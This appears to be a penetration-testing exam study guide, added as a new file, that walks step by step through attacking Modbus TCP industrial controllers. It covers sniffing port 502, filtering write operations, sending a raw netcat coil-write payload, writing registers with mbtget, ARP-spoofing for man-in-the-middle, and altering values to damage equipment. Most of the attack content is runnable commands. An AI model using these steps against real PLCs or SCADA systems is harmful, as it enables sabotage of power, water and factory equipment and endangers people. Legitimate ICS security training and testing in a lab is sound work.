@@ -1,0 +1,189 @@
+
+🧠 LAB CONTEXT
+🟥 Attacker Machine (Kali)
+🟧 Network (where PLC/SCADA traffic flows)
+🟩 Target Device (PLC / RTU using Modbus TCP)
+🔹 WHAT IS MODBUS (VERY IMPORTANT)
+Runs on TCP port 502
+Used in:
+Power plants
+Factories
+Water systems
+
+👉 NO authentication ❌
+👉 NO encryption ❌
+
+🧠 Meaning: If you see it → you can control it
+
+🔹 PHASE 1: Detect Modbus Traffic
+🟥 Run on: Attacker (Kali)
+🔍 Capture Traffic
+
+tcpdump -i eth0 port 502 -nn
+
+🔍 Explanation
+-i eth0 → Interface
+port 502 → Filter Modbus traffic
+-nn → No DNS/port resolution
+🎯 Output Example
+IP 192.168.1.10.502 > 192.168.1.20.34567
+
+👉 Confirms:
+
+Modbus server (PLC)
+Client (SCADA)
+🔹 PHASE 2: Save Traffic for Analysis
+🟥 Run on: Kali
+🔥 Capture to File
+
+tcpdump -i eth0 port 502 -w modbus.pcap
+
+🔍 Explanation
+-w modbus.pcap → Save capture
+🔹 PHASE 3: Analyze in Wireshark
+🟥 Run on: Kali GUI
+🔍 Open File
+
+wireshark modbus.pcap
+
+🔥 Apply Filter
+
+modbus
+
+🎯 You See:
+Function Codes
+Register values
+Commands
+🔹 PHASE 4: Understand Modbus Packets
+🔍 Key Fields (CRITICAL FOR EXAM)
+Field	Meaning
+Function Code	What action
+Address	Register
+Data	Value
+🔥 Common Function Codes
+Code	Action
+1	Read Coils
+3	Read Holding Registers
+5	Write Single Coil
+6	Write Register
+16	Write Multiple Registers
+🔹 PHASE 5: Identify Sensitive Operations
+🟥 Run on: Wireshark
+🔍 Filter Write Operations
+
+modbus.func_code == 5
+modbus.func_code == 6
+
+🎯 Why?
+
+👉 These modify device behavior
+
+🔥 Example
+Write Single Coil → Turn ON/OFF device
+
+🧠 This is real-world sabotage
+
+🔹 PHASE 6: Replay / Manipulate Traffic
+🟥 Run on: Kali
+🔥 Use netcat (RAW attack)
+Example Payload (Manual Modbus Write)
+
+printf '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xFF\x00' | nc 192.168.1.10 502
+
+🔍 Explanation
+Raw Modbus packet
+\x05 → Function code (write coil)
+\xFF00 → Turn ON
+🔹 PHASE 7: Use Modbus Tools (Better Way)
+🟥 Run on: Kali
+🔧 Install Tool
+
+sudo apt install mbtget
+
+🔍 Read Registers
+
+mbtget -r 0 -c 10 192.168.1.10
+
+🔍 Explanation
+-r 0 → Start register
+-c 10 → Count
+🔥 Write Register
+
+mbtget -w 5 100 192.168.1.10
+
+🔍 Explanation
+Write value 100 to register 5
+🔹 PHASE 8: MITM Attack (Advanced 🔥)
+🟥 Run on: Kali
+🔥 ARP Spoof
+
+arpspoof -i eth0 -t 192.168.1.20 192.168.1.10
+
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.20
+
+🔍 Explanation
+Become man-in-the-middle
+Intercept & modify Modbus traffic
+🔥 Capture While MITM
+
+tcpdump -i eth0 port 502 -w mitm_modbus.pcap
+
+🔹 PHASE 9: Modify Traffic (Real Attack)
+
+👉 You see:
+
+Write Register → Value 20
+
+👉 You change to:
+
+Value 1000
+
+🧠 This can:
+
+Overheat machines
+Shut down systems
+Damage equipment
+🔹 PHASE 10: Wireshark Deep Filters
+🟥 Run on: Wireshark
+🔍 Show Only Writes
+
+modbus.func_code in {5,6,16}
+
+🔍 Show Specific Register
+
+modbus.reference_num == 5
+
+🔍 Show Errors
+
+modbus.exception_code
+
+🧠 FULL ATTACK FLOW
+Detect → Capture → Analyze → Identify Write Ops → Replay → Modify → Impact
+🔥 WHAT EXAMINER IS TESTING
+Skill	What You Do
+Traffic capture	tcpdump
+Protocol analysis	Wireshark
+ICS understanding	Modbus
+Exploitation	Write commands
+MITM	ARP spoof
+⚠️ COMMON CPENT MISTAKES
+
+❌ Only sniffing (no attack)
+❌ Ignoring function codes
+❌ Not filtering properly
+❌ Missing write operations
+❌ Not replaying packets
+
+💡 REAL CPENT STRATEGY
+
+👉 If you see port 502:
+
+Capture traffic
+Identify commands
+Find write operations
+Replay or modify
+🔥 FINAL GOLD RULE
+
+🧠 Modbus = TRUST-BASED PROTOCOL
+
+If you can see it → you can control it
